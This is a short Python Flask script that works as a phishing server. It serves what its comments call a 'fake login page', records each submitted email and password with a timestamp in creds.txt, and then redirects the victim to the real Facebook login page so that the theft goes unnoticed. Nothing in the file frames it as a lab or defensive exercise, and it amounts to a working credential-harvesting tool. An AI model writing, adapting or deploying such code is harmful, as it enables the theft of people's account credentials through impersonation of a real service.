from flask import Flask, render_template, request, redirect
import datetime

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('index.html') # renders the fake login page

@app.route('/login', methods=['POST']) # re-routes the entered credentials
def handle_login():
    email = request.form.get('email') 
    password = request.form.get('password')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Marks the timestamp

    with open("creds.txt", "a") as f: #Saves the credentials in the targeted file
        f.write(f"[{timestamp}] Email: {email}, Password: {password}\n")

    return redirect("https://www.facebook.com/login.php")  # Redirect to real Facebook login page

if __name__ == '__main__':
    app.run(debug=True)
